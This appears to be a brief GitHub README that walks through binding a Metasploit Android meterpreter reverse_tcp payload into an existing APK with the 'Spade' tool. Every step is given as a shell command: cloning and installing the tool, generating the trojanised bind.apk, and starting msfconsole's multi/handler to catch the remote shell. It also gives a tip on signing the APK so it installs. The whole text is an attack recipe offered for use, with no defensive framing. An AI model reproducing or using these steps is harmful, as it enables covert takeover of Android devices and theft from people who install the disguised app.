# Metasploit-payload-to-existing-App-
Payload binding in existing app (spade method)


$ git clone https://github.com/Cesar-Hack-Gray/Spade

$ cd Spade

$ ls

$ cp install.sh $HOME

$ cd

$ ls

$ bash install.sh

$cd

$ cd spade

$ bash spade /sdcard/org.apk
( set lhost and lport)

$ cd Gray

$ cp bind.apk /sdcard

$ msfconsole

ms5>  use exploit/multi/handler
ms5> set payload android/meterpreter/reverse_tcp
ms5> set lhost 
ms5> set port
ms5> exploit

(if any problem in installing app . download apk sign and after install using apk sign)


                                          ----Jack Daniel

